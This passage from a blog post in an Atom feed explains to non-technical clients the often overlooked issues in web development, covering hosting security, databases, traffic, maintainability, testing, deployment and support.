<li><strong>Hosting</strong> - This issue comes with a stack of other issues that most people don't even think about (sometimes even developers!). Do you have your own host? Do you have a shared host? Dedicated host? Do you need it in your own country? Do you need Windows or Linux? Do you need email facilities? Do you need SSL? Do you need a <a href="http://en.wikipedia.org/wiki/Content_Delivery_Network" title="Content delivery network">CDN</a>? Choosing a location for your site is affected by so many things. For example, if you're looking for a fully secure site which keeps track of user details and sensitive information (such as credit cards) then a shared hosting solution is an <em>EPIC FAIL</em>. In case the reason isn't obvious I'll tell you. If you use a shared host, then the entire machine is only as secure as the weakest account. If another site, owned by someone else, is compromised then the attacker owns the box which contains YOUR sites as well.</li>
<li><strong>Database</strong> - This isn't just about which one to use. It's about how to use it. Databases are underestimated and often misunderstood. It's <em>very</em> easy to do databases wrong. This is a real kicker for those applications that are very database heavy. In particular, applications which require complex relationships and/or deep searching capabilities. If your application relies on an insanely speedy, distributed database or is search-heavy, you had best get yourself a DB guru ... and be prepared to pay for them! A recent example with some interested details was recently posted on <a href="http://blog.stackoverflow.com/2008/11/sql-2008-full-text-search-problems/" title="SQL 2008 Full Text Search Problems">StackOverflow</a>, go have a read!</li>
<li><strong>Traffic</strong> - If you're aiming to build a site that isn't going to be used often or doesn't have a great deal of content, then this might not be so much of an issue. But if you have a site that is going to be bombarded with traffic, don't expect your first cut of your system to, er, cut it. I once heard a semi-famous man say "<a href="http://www.codinghorror.com/blog/archives/000957.html" title="Everything is fast for small n">Everything is fast for small <em>n</em>"</a>, and he's dead right. In development and testing, your app will probably fly. But under load, with thousands of people hitting it at the same time, it may just keel over and die. Be prepared to face this problem in the development stage.</li>
<li><strong>Maintainability</strong> - I left this one last because it's a little verbose and somewhat random. So many things can affect the maintainability of the site. The main problem here though is that in general, the idea of maintenance after a site has been developed is far from anyone's thoughts. Maintenance is where you'll spend most of your cash long term. Minimising the potential issues during development really is key to making a site which isn't going to cost the earth to maintain or enhance. The most common cause of highly unmaintainable websites is "Little Johnny" (LJ). LJ is the bloke that someone knows through a friend of a friend, or through the family. He's the guy who "knows stuff about computers". Of course, that means that he can &lt;sarcasm&gt;build commercial websites that are flexible, secure, fast, extendible, easy to maintain and that WORK&lt;/sarcasm&gt;. In all seriousness, you might know someone who knows something about computers, but if you're serious about your site, then get someone who knows what they're doing. You'll pay more in the long run for someone who doesn't. Either that, or take one of your employees, and put them through a course so that they can learn how it's done. To sum up, if you want to reduce the cost of maintenance there is a lot of work involved, and your developers need to know what they're doing. Be prepared for a lot of work in this area.</li>
</ul>


<h2>Testing Issues</h2>

<p>Testing? What's that?</p>

<p>It's frightening that even in Enterprise software, testing is generally an afterthought. Recently I was fortunate enough to be part of a team where testing was a huge part of the development process. It was <em>really</em> good and the result was a seriously higher quality application.</p>

<p>Developers do not know how to test their own code properly. Sure, they can write unit tests, and they do some form of manual functional testing on a daily basis while they're building the software. This is <strong>not</strong> the same as having a full test plan and suite of tests to verify the quality of the application.</p>

<p>Do yourself a favour, spend some of your budget and get some testers in. They will put your application/site through its paces instead of your users!</p>

<h2>Deployment Issues</h2>

<p>Once you've worked with a development team, you'll become very familiar with the following phrase:</p>

<blockquote><p>It works on my machine.</p></blockquote>

<p>It's something that you'll hear constantly. I'll admit to saying it on a regular basis.</p>

<p>The point here is that it is very common for things to work in the development environment, but end up breaking when deployed to a production environment. Deployment is another often overlooked area of the process. When it <em>is</em> considered, it's underestimated.</p>

<p>Be careful. Here be dragons. Before you get stuck, speak to someone who <a href="http://johnmcfadyen.spaces.live.com/" title="John Mcfadyen's Windows Installer blog">knows what they're doing</a>.</p>

<h2>Support Issues</h2>

<p>So you've managed to ship your application. It's online, it's deployed and it's running. But something goes wrong. The site breaks every now and then. Users are having issues with the payment portal. People using Firefox on Mac OSX can't sign in. Reports are coming back with incorrect values.</p>

<p>Do you have a plan in place to handle these requests? Do you have a <a href="http://en.wikipedia.org/wiki/Bugtracker" title="Bug tracker">bug tracking system</a>? Do you have a support team ready to handle requests? Have you kept any of the development team on board to help you with the support issues?</p>

<p>Generally, the answer to all of these questions is <em>no</em>. My advice would be to make it a <em>yes</em>. Put a plan in place to help you with the teething issues once you've gone live. Trust me, there <em>will</em> be issues.</p>

<h2>Conclusion</h2>

<p>I hope that the target audience have a little more visibility of the issues that are faced when building websites (and software in general). I hope that they learn from it and take some of the advice and do proper preparation before undertaking a development project.</p>

<p>Finally, I really do hope that it stops some of you from coming out with the comments listed at the start of this post.</p>

<p>As always, feedback and comments are welcomed and appreciated. Cheers!</p>
]]></content>
  </entry>
  
</feed>
